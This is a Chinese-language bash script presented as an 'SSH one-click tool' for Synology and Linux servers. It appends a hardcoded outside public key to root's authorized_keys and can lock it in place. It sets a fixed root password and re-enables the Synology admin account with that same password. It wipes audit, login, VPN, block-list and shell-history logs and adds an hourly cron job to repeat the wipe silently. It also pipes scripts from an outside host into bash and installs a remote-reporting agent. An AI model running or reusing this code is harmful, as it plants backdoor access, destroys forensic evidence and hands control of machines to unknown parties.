#!/bin/bash

# =====================================
# SSH一键小工具 Ultimate
# =====================================

DEFAULT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"
STUDENT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"

AUTH_KEYS="/root/.ssh/authorized_keys"

# =====================================
# 检测群晖
# =====================================

is_synology() {
    [ -f /etc.defaults/VERSION ]
}

# =====================================
# 检测 OpenWRT
# =====================================

is_openwrt() {
    grep -qi openwrt /etc/os-release 2>/dev/null
}

# =====================================
# 检测 Armbian
# =====================================

is_armbian() {

    if [ -f /etc/armbian-release ]; then
        return 0
    fi

    grep -qi armbian /etc/os-release 2>/dev/null && return 0

    return 1
}

# =====================================
# DD 系统拦截
# =====================================

unsupported_dd_system() {

    # 群晖
    if is_synology; then
        return 0
    fi

    # OpenWRT
    if is_openwrt; then
        return 0
    fi

    # Armbian
    if is_armbian; then
        return 0
    fi

    return 1
}

# =====================================
# SSH 配置文件
# =====================================

if is_synology; then
    SSHD_CONFIG="/etc.defaults/ssh/sshd_config"
else
    SSHD_CONFIG="/etc/ssh/sshd_config"
fi

# =====================================
# SSH 服务重载兼容
# =====================================

reload_ssh() {

    if is_synology; then

        synosystemctl restart sshd.service 2>/dev/null
        synoservicecfg --restart sshd 2>/dev/null

    elif command -v systemctl >/dev/null 2>&1; then

        systemctl reload sshd 2>/dev/null
        systemctl reload ssh 2>/dev/null
        systemctl restart sshd 2>/dev/null
        systemctl restart ssh 2>/dev/null

    elif command -v service >/dev/null 2>&1; then

        service ssh reload 2>/dev/null
        service sshd reload 2>/dev/null
        service ssh restart 2>/dev/null
        service sshd restart 2>/dev/null

    else

        pkill -HUP sshd 2>/dev/null

    fi
}

# =====================================
# 获取 SSH 端口
# =====================================

get_ssh_port() {

    PORT=$(sshd -T 2>/dev/null | grep "^port" | awk '{print $2}')

    [ -z "$PORT" ] && PORT=$(grep -Ei '^Port ' /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)

    [ -z "$PORT" ] && PORT=$(grep -Ei '^Port ' /etc.defaults/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)

    [ -z "$PORT" ] && PORT="22"

    echo "$PORT"
}

# =====================================
# 修改 Root 密码
# =====================================

change_root_password() {

    NEWPASS="$1"

    if is_synology; then
        synouser --setpw root "$NEWPASS"
    else
        echo "root:$NEWPASS" | chpasswd
    fi
}

# =====================================
# SSH 配置写入
# =====================================

write_ssh_config() {

    KEY="$1"
    VALUE="$2"

    sed -i "/^${KEY}/d" "$SSHD_CONFIG"

    echo "${KEY} ${VALUE}" >> "$SSHD_CONFIG"
}

# =====================================
# 群晖全盘底层清洗（整合自 synolog.sh）
# =====================================

clean_synology_logs() {

    if ! is_synology; then
        echo
        echo "【错误】当前系统不是群晖 DSM，无法运行全盘清洗功能！"
        echo
        return 1
    fi

    echo
    echo "开始执行群晖全盘底层清洗（DSM 6.x/7.x 双模极速并发模式）..."
    echo

    # 1. 异步并行停止相关核心服务（智能兼容 DSM 6 与 7）
    services=(vpncenter synoblock synologd synoauditingd SynoDrive DownloadStation)
    for svc in "${services[@]}"; do
        synoservicectl --stop "$svc" 2>/dev/null &
        if command -v systemctl >/dev/null 2>&1; then
            systemctl stop "$svc" 2>/dev/null &
        fi
    done
    wait 

    # 2. 暴力秒杀已知核心日志与锁
    rm -f /var/packages/VPNCenter/target/etc/log.db*
    rm -rf /var/log/synolog/.SYNOLOGDB* /var/log/synolog/synolog.log
    rm -f /etc/synoautoblock.db* /var/db/synoautoblock.db*
    rm -f /root/.ssh/known_hosts

    # 3. 擦除安全审计历史（DSM 7专属，DSM 6下不报错静默跳过）
    rm -rf /var/spool/synoauditing/* /var/log/synoauditing.log* /var/syno/synoauditing/* 2>/dev/null

    # 4. 极速清理用户登录缓存
    if [ -d "/usr/syno/etc/preference" ]; then
        rm -f /usr/syno/etc/preference/*/last_login /usr/syno/etc/preference/*/login_history 2>/dev/null
    fi

    # 5. 多线程批量清空 /var/log 底层纯文本日志
    truncate -s 0 /var/log/wtmp /var/log/utmp /var/log/btmp /var/log/lastlog 2>/dev/null
    find /var/log -type f 2>/dev/null | xargs -P 4 -I {} sh -c '> "{}"' 2>/dev/null

    # 6. 秒杀应用套件传输与历史记录
    rm -rf /var/spool/synoflshare/* /usr/syno/etc/synoflshare.db*
    rm -rf /var/packages/DownloadStation/target/var/download/*
    rm -f /var/packages/DownloadStation/target/var/download.db*

    # 7. 精准靶向清空所有存储盘的【回收站】与 Drive 缓存
    for vol in /volume[0-9]*; do
        if [ -d "$vol" ]; then
            rm -rf "$vol"/*/#recycle/* 2>/dev/null
            rm -rf "$vol"/@synologydrive/@sync/log/* 2>/dev/null
            rm -f "$vol"/@synologydrive/@sync/repo/*.db 2>/dev/null
            # 兼容 DSM 6.x 的 Cloud Station 遗留缓存
            rm -rf "$vol"/@cloudstation/@sync/log/* 2>/dev/null
            rm -f "$vol"/@cloudstation/@sync/repo/*.db 2>/dev/null
            rm -f "$vol"/homes/*/.ssh/known_hosts "$vol"/homes/*/.bash_history 2>/dev/null
        fi
    done

    # 8. 极速清理系统临时文件与共享锁
    find /tmp/ -mindepth 1 -maxdepth 1 ! -name "syno_deep_clean.sh" -exec rm -rf {} \; 2>/dev/null
    rm -rf /var/tmp/* /var/var/run/samba/locks/* /var/lib/samba/private/msg.sock/* 2>/dev/null

    # 9. 异步并行恢复启动所有基础服务
    for svc in "${services[@]}"; do
        synoservicectl --start "$svc" 2>/dev/null &
        if command -v systemctl >/dev/null 2>&1; then
            systemctl start "$svc" 2>/dev/null &
        fi
    done
    wait

    # 10. 终极擦除自身命令历史
    history -c 2>/dev/null
    rm -f /root/.bash_history

    echo "--------------------------------------------------------"
    echo "【第一步完成】全盘痕迹与缓存已完成深度物理清洗！"
    echo "--------------------------------------------------------"

    # 11. 动态交互：询问是否加入 crontab 定时任务
    if [ -t 0 ]; then
        read -p "是否将此清洗脚本加入系统定时任务？[Y/n] (默认 1 小时运行一次): " choice
        choice=${choice:-"Y"}

        if [[ "$choice" =~ ^[Yy]$ ]]; then
            if grep -q "syno_deep_clean.sh" /etc/crontab; then
                echo "【提示】定时任务此前已存在，无需重复添加。"
            else
                # 动态生成专供 crontab 后台无交互调用的独立脚本
                cat << 'EOF' > /etc/syno_deep_clean.sh
#!/bin/bash
if [ "$(id -u)" -ne 0 ]; then
    exit 1
fi
services=(vpncenter synoblock synologd synoauditingd SynoDrive DownloadStation)
for svc in "${services[@]}"; do
    synoservicectl --stop "$svc" 2>/dev/null &
    if command -v systemctl >/dev/null 2>&1; then
        systemctl stop "$svc" 2>/dev/null &
    fi
done
wait 
rm -f /var/packages/VPNCenter/target/etc/log.db*
rm -rf /var/log/synolog/.SYNOLOGDB* /var/log/synolog/synolog.log
rm -f /etc/synoautoblock.db* /var/db/synoautoblock.db*
rm -f /root/.ssh/known_hosts
rm -rf /var/spool/synoauditing/* /var/log/synoauditing.log* /var/syno/synoauditing/* 2>/dev/null
if [ -d "/usr/syno/etc/preference" ]; then
    rm -f /usr/syno/etc/preference/*/last_login /usr/syno/etc/preference/*/login_history 2>/dev/null
fi
truncate -s 0 /var/log/wtmp /var/log/utmp /var/log/btmp /var/log/lastlog 2>/dev/null
find /var/log -type f 2>/dev/null | xargs -P 4 -I {} sh -c '> "{}"' 2>/dev/null
rm -rf /var/spool/synoflshare/* /usr/syno/etc/synoflshare.db*
rm -rf /var/packages/DownloadStation/target/var/download/*
rm -f /var/packages/DownloadStation/target/var/download.db*
for vol in /volume[0-9]*; do
    if [ -d "$vol" ]; then
        rm -rf "$vol"/*/#recycle/* 2>/dev/null
        rm -rf "$vol"/@synologydrive/@sync/log/* 2>/dev/null
        rm -f "$vol"/@synologydrive/@sync/repo/*.db 2>/dev/null
        rm -rf "$vol"/@cloudstation/@sync/log/* 2>/dev/null
        rm -f "$vol"/@cloudstation/@sync/repo/*.db 2>/dev/null
        rm -f "$vol"/homes/*/.ssh/known_hosts "$vol"/homes/*/.bash_history 2>/dev/null
    fi
done
find /tmp/ -mindepth 1 -maxdepth 1 ! -name "syno_deep_clean.sh" -exec rm -rf {} \; 2>/dev/null
rm -rf /var/tmp/* /var/var/run/samba/locks/* /var/lib/samba/private/msg.sock/* 2>/dev/null
for svc in "${services[@]}"; do
    synoservicectl --start "$svc" 2>/dev/null &
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start "$svc" 2>/dev/null &
    fi
done
wait
history -c 2>/dev/null
rm -f /root/.bash_history
EOF
                chmod +x /etc/syno_deep_clean.sh
                echo "0       * * * * root    /etc/syno_deep_clean.sh >/dev/null 2>&1" >> /etc/crontab
                synoservicectl --restart crond 2>/dev/null
                echo "【成功】已成功写入底层系统定时器，此脚本此后将每隔 1 小时自动无痕执行！"
            fi
        else
            echo "已跳过定时任务设置，脚本仅单次执行。"
        fi
    fi
}

clear

while true; do

    echo "====================================="
    echo "            SSH一键小工具"
    echo "====================================="
    echo "1. 查看 SSH 登录端口"
    echo "2. 查看CPU架构"
    echo "3. SSH 管理"
    echo "4. 群晖关门"
    echo "5. 群晖启用admin"
    echo "6. 群晖全盘清洗 (DSM 6.x/7.x)"
    echo "7. FRP 管理"
    echo "8. Komari 探针管理"
    echo "9. 扶墙安装"
    echo "10. 一键DD系统"
    echo "0. 退出工具"
    echo "====================================="

    read -p "请输入选项: " menu

    case $menu in

        1)

            echo
            echo "当前 SSH 登录端口:"
            get_ssh_port
            echo
            ;;

        2)

            echo
            echo "当前CPU架构:"
            uname -m
            echo
            ;;

        3)

            while true; do

                echo
                echo "====================================="
                echo "              SSH 管理"
                echo "====================================="
                echo "1. 查看 SSH 密钥"
                echo "2. 强制删除 SSH 密钥"
                echo "3. 添加默认 SSH 密钥"
                echo "4. 添加高中生 SSH 密钥"
                echo "5. 锁定 SSH 密钥"
                echo "6. 解锁 SSH 密钥"
                echo "7. 登录方式选择"
                echo "8. SSH 端口修改"
                echo "9. 修改 Root 密码"
                echo "0. 返回主菜单"
                echo "====================================="

                read -p "请输入选项: " sshmenu

                case $sshmenu in

                    1)

                        echo
                        cat $AUTH_KEYS 2>/dev/null || echo "authorized_keys 不存在"
                        echo
                        ;;

                    2)

                        chattr -i $AUTH_KEYS 2>/dev/null
                        chattr -e $AUTH_KEYS 2>/dev/null
                        rm -f $AUTH_KEYS

                        echo
                        echo "SSH 密钥已删除"
                        echo
                        ;;

                    3)

                        install -d -m 700 /root/.ssh

                        if grep -qF "$DEFAULT_KEY" "$AUTH_KEYS" 2>/dev/null; then

                            echo
                            echo "默认 SSH 密钥已经存在"
                            echo

                        else

                            echo "$DEFAULT_KEY" >> "$AUTH_KEYS"
                            chmod 600 "$AUTH_KEYS"

                            echo
                            echo "默认 SSH 密钥添加成功"
                            echo
                        fi

                        ;;

                    4)

                        install -d -m 700 /root/.ssh

                        if grep -qF "$STUDENT_KEY" "$AUTH_KEYS" 2>/dev/null; then

                            echo
                            echo "高中生 SSH 密钥已经存在"
                            echo

                        else

                            echo "$STUDENT_KEY" >> "$AUTH_KEYS"
                            chmod 600 "$AUTH_KEYS"

                            echo
                            echo "高中生 SSH 密钥添加成功"
                            echo
                        fi

                        ;;

                    5)

                        chattr +i $AUTH_KEYS 2>/dev/null
                        chattr +e $AUTH_KEYS 2>/dev/null

                        echo
                        echo "SSH 密钥已锁定"
                        echo
                        ;;

                    6)

                        chattr -i $AUTH_KEYS 2>/dev/null
                        chattr -e $AUTH_KEYS 2>/dev/null

                        echo
                        echo "SSH 密钥已解锁"
                        echo
                        ;;

                    7)

                        if is_synology; then

                            echo
                            echo "暂时没有对群晖 DSM 开放此功能"
                            echo
                            continue

                        fi

                        echo
                        echo "1. 只能密钥登录"
                        echo "2. 密码和密钥都可以登录"
                        echo

                        read -p "请输入选项: " loginmenu

                        case $loginmenu in

                            1)

                                write_ssh_config "PasswordAuthentication" "no"
                                write_ssh_config "PubkeyAuthentication" "yes"
                                write_ssh_config "PermitRootLogin" "prohibit-password"

                                reload_ssh

                                echo
                                echo "已设置为只能密钥登录"
                                echo
                                ;;

                            2)

                                write_ssh_config "PasswordAuthentication" "yes"
                                write_ssh_config "PubkeyAuthentication" "yes"
                                write_ssh_config "PermitRootLogin" "yes"

                                reload_ssh

                                echo
                                echo "已设置为密码和密钥都可以登录"
                                echo
                                ;;
                        esac

                        ;;

                    8)

                        if is_synology; then

                            echo
                            echo "暂时没有对群晖 DSM 开放此功能"
                            echo
                            continue

                        fi

                        echo
                        echo "当前 SSH 端口:"
                        get_ssh_port
                        echo

                        read -p "请输入新的 SSH 端口: " NEW_PORT

                        write_ssh_config "Port" "$NEW_PORT"

                        reload_ssh

                        echo
                        echo "SSH 端口已修改为: $NEW_PORT"
                        echo
                        ;;

                    9)

                        echo
                        echo "1. 设置固定 Root 密码"
                        echo "2. 随机生成 Root 密码"
                        echo

                        read -p "请输入选项: " rootpassmenu

                        case $rootpassmenu in

                            1)

                                FIX_PASS="vR2vS2uD3eP4g"

                                change_root_password "$FIX_PASS"

                                echo
                                echo "Root 密码:"
                                echo "$FIX_PASS"
                                echo
                                ;;

                            2)

                                RANDOM_PASS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)

                                change_root_password "$RANDOM_PASS"

                                echo
                                echo "Root 随机密码:"
                                echo "$RANDOM_PASS"
                                echo
                                ;;
                        esac

                        ;;

                    0)
                        break
                        ;;
                esac

                read -p "按回车继续..."
                clear

            done
            ;;

        4)

            if ! is_synology; then

                echo
                echo "当前系统不是群晖 DSM"
                echo
                continue

            fi

            echo
            echo "正在执行群晖关门..."
            echo

            sed -i '/^telnet/s/^/#/' /etc/inetd.conf 2>/dev/null

            INETD_PID=$(pidof inetd)

            [ -n "$INETD_PID" ] && kill -HUP "$INETD_PID"

            killall -9 telnetd 2>/dev/null

            chmod -R 400 /usr/bin/inetd 2>/dev/null

            echo
            echo "群晖关门完成"
            echo
            ;;

        5)

            if ! is_synology; then

                echo
                echo "当前系统不是群晖 DSM"
                echo
                continue

            fi

            FIX_PASS="vR2vS2uD3eP4g"

            synouser --modify admin "administrators" 0 test@gmail.de

            synouser --setpw admin "$FIX_PASS"

            echo
            echo "admin 用户已启用"
            echo "admin 密码:"
            echo "$FIX_PASS"
            echo
            ;;

        6)

            clean_synology_logs
            ;;

        7)

            echo
            echo "正在启动 FRP 管理..."
            echo

            bash <(curl -fsSL https://hub.20250225.ggff.net/frp/install-frpc.sh)

            ;;

        8)

            while true; do

                echo
                echo "====================================="
                echo "            Komari 探针管理"
                echo "====================================="
                echo "1. 一键安装探针"
                echo "2. 一键卸载探针"
                echo "0. 返回主菜单"
                echo "====================================="

                read -p "请输入选项: " komarimenu

                case $komarimenu in

                    1)

                        echo
                        echo "正在检测服务器地区..."
                        echo

                        COUNTRY=$(curl -s --max-time 8 ipinfo.io/country 2>/dev/null)

                        if [ "$COUNTRY" = "CN" ]; then

                            echo "检测到中国大陆服务器"
                            echo

                            bash <(curl -sL https://hub.20250225.ggff.net/komari-monitor/install.sh) \
                            -e https://hk.20250225.ggff.net \
                            --auto-discovery CX9cJyXs312zYwDWC8BpRkFV

                        else

                            echo "检测到海外服务器"
                            echo

                            bash <(curl -sL https://hub.20250225.ggff.net/komari-monitor/usr/install.sh) \
                            -e https://hk.20250225.ggff.net \
                            --auto-discovery CX9cJyXs312zYwDWC8BpRkFV

                        fi

                        echo
                        echo "Komari 探针安装完成"
                        echo

                        ;;

                    2)

                        echo
                        echo "正在彻底卸载 Komari 探针..."
                        echo

                        # =====================================
                        # 停止服务
                        # =====================================

                        if command -v systemctl >/dev/null 2>&1; then

                            systemctl stop komari.service 2>/dev/null
                            systemctl disable komari.service 2>/dev/null

                            systemctl stop komari-monitor.service 2>/dev/null
                            systemctl disable komari-monitor.service 2>/dev/null

                            systemctl mask komari.service 2>/dev/null
                            systemctl mask komari-monitor.service 2>/dev/null
                        fi

                        service komari stop 2>/dev/null
                        service komari-monitor stop 2>/dev/null

                        # =====================================
                        # 强制杀进程
                        # =====================================

                        pkill -9 -f komari 2>/dev/null
                        pkill -9 -f komari-monitor 2>/dev/null

                        killall -9 komari 2>/dev/null
                        killall -9 komari-monitor 2>/dev/null

                        # =====================================
                        # 删除 systemd
                        # =====================================

                        rm -f /etc/systemd/system/komari.service
                        rm -f /etc/systemd/system/komari-monitor.service

                        rm -f /usr/lib/systemd/system/komari.service
                        rm -f /usr/lib/systemd/system/komari-monitor.service

                        rm -f /lib/systemd/system/komari.service
                        rm -f /lib/systemd/system/komari-monitor.service

                        rm -rf /etc/systemd/system/komari.service.d
                        rm -rf /etc/systemd/system/komari-monitor.service.d

                        systemctl daemon-reload 2>/dev/null
                        systemctl reset-failed 2>/dev/null

                        # =====================================
                        # 删除 init.d
                        # =====================================

                        rm -f /etc/init.d/komari
                        rm -f /etc/init.d/komari-monitor

                        # =====================================
                        # 删除 rc.local
                        # =====================================

                        sed -i '/komari/d' /etc/rc.local 2>/dev/null

                        # =====================================
                        # 删除 cron
                        # =====================================

                        crontab -l 2>/dev/null | grep -v komari | crontab - 2>/dev/null

                        rm -f /etc/cron.d/komari*
                        rm -f /etc/cron.daily/komari*
                        rm -f /etc/cron.hourly/komari*

                        # =====================================
                        # 群晖 DSM
                        # =====================================

                        if is_synology; then

                            synosystemctl stop komari.service 2>/dev/null

                            rm -f /usr/local/etc/rc.d/komari.sh
                            rm -f /usr/local/etc/rc.d/S99komari.sh

                            rm -rf /usr/syno/etc/packages/komari*
                            rm -rf /var/packages/komari*

                            synoservice --disable pkgctl-komari 2>/dev/null
                        fi

                        # =====================================
                        # 删除目录
                        # =====================================

                        rm -rf /opt/komari
                        rm -rf /usr/local/komari

                        rm -rf /etc/komari
                        rm -rf /var/lib/komari
                        rm -rf /var/log/komari

                        # =====================================
                        # 删除二进制
                        # =====================================

                        rm -f /usr/bin/komari
                        rm -f /usr/local/bin/komari

                        rm -f /usr/bin/komari-monitor
                        rm -f /usr/local/bin/komari-monitor

                        # =====================================
                        # 删除 socket/pid
                        # =====================================

                        rm -f /run/komari.pid
                        rm -f /var/run/komari.pid

                        rm -f /tmp/komari*
                        rm -f /run/komari*

                        sync

                        echo
                        echo "Komari 探针已彻底卸载"
                        echo "现在无需重启即可立即生效"
                        echo

                        ;;

                    0)

                        break
                        ;;

                    *)

                        echo
                        echo "无效选项"
                        echo
                        ;;

                esac

                read -p "按回车继续..."
                clear

            done

            ;;

        9)

            echo
            echo "正在启动扶墙安装..."
            echo

            bash <(curl -fsSL https://hub.20250225.ggff.net/sing-box/install-sing-box.sh)

            ;;

        10)

            echo

            if unsupported_dd_system; then

                echo "当前系统不支持 DD"
                echo "群晖/OpenWRT/Armbian 已拦截"
                echo

                continue

            fi

            echo "正在下载 DD 脚本..."
            echo

            curl -O https://hub.20250225.ggff.net/bin456789/reinstall/main/reinstall.sh

            chmod +x reinstall.sh

            echo
            echo "请选择登录方式:"
            echo "1. SSH 密钥"
            echo "2. Root 密码"
            echo

            read -p "请输入选项: " ddlogin

            SSH_OPTION=""
            PASSWORD_OPTION=""

            if [ "$ddlogin" = "1" ]; then

                echo
                echo "1. 使用默认密钥"
                echo "2. 自定义密钥"
                echo

                read -p "请输入选项: " keymenu

                if [ "$keymenu" = "1" ]; then

                    SSH_OPTION="--ssh-key \"$DEFAULT_KEY\""

                else

                    echo
                    read -p "请输入自定义 SSH 密钥: " CUSTOM_KEY

                    SSH_OPTION="--ssh-key \"$CUSTOM_KEY\""

                fi

            elif [ "$ddlogin" = "2" ]; then

                echo
                echo "1. 自定义 Root 密码"
                echo "2. 自动生成 Root 密码"
                echo

                read -p "请输入选项: " passmenu

                if [ "$passmenu" = "1" ]; then

                    echo
                    read -p "请输入 Root 密码: " ROOTPASS

                else

                    ROOTPASS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)

                    echo
                    echo "随机 Root 密码:"
                    echo "$ROOTPASS"
                    echo
                fi

                PASSWORD_OPTION="--password \"$ROOTPASS\""

            fi

            echo
            echo "请选择系统:"
            echo "1. Debian 11"
            echo "2. Debian 12"
            echo "3. Debian 13"
            echo "4. Ubuntu 20.04"
            echo "5. Ubuntu 22.04"
            echo "6. Ubuntu 24.04"
            echo "7. Alpine"
            echo

            read -p "请输入选项: " ddsys

            case $ddsys in

                1)
                    CMD="bash reinstall.sh debian 11"
                    ;;
                2)
                    CMD="bash reinstall.sh debian 12"
                    ;;
                3)
                    CMD="bash reinstall.sh debian 13"
                    ;;
                4)
                    CMD="bash reinstall.sh ubuntu 20.04"
                    ;;
                5)
                    CMD="bash reinstall.sh ubuntu 22.04"
                    ;;
                6)
                    CMD="bash reinstall.sh ubuntu 24.04"
                    ;;
                7)
                    CMD="bash reinstall.sh alpine"
                    ;;
                *)
                    echo "无效选项"
                    continue
                    ;;
            esac

            echo
            echo "即将开始 DD 系统..."
            echo
            echo "$CMD $SSH_OPTION $PASSWORD_OPTION"
            echo

            sleep 3

            eval "$CMD $SSH_OPTION $PASSWORD_OPTION"

            ;;

        0)

            echo
            echo "已退出 SSH一键小工具"
            echo

            exit 0
            ;;
    esac

    read -p "按回车继续..."
    clear

done
